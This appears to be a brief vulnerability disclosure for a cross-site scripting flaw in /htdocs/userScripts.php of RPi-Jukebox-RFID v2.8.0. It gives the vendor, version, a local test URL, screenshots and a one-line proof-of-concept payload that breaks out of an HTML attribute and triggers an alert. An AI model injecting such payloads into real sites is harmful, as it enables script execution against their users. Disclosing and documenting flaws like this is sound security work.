# XSS vulnerability in [RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID) v2.8.0 of file /userScripts.php

**vender**:

- [MiczFlor/RPi-Jukebox-RFID: A Raspberry Pi jukebox, playing local music, podcasts, web radio and streams triggered by RFID cards, web app or home automation. All plug and play via USB. GPIO scripts available.](https://github.com/MiczFlor/RPi-Jukebox-RFID)

**SoftLink**:

- [Release v2.8.0: Fix Spotify Authentication · MiczFlor/RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID/releases/tag/v2.8.0)

**Vulnerable File**

- /htdocs/userScripts.php

**Version**

- 2.8.0

### POC

```
"><img src=x onerror=alert('xss')>
```

http://192.168.100.101/phoniebox/htdocs/userScripts.php

![image-20250825041732477](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508250417654.png)

![image-20250825041752012](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508250417679.png)



![image-20250825041903710](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508250419853.png)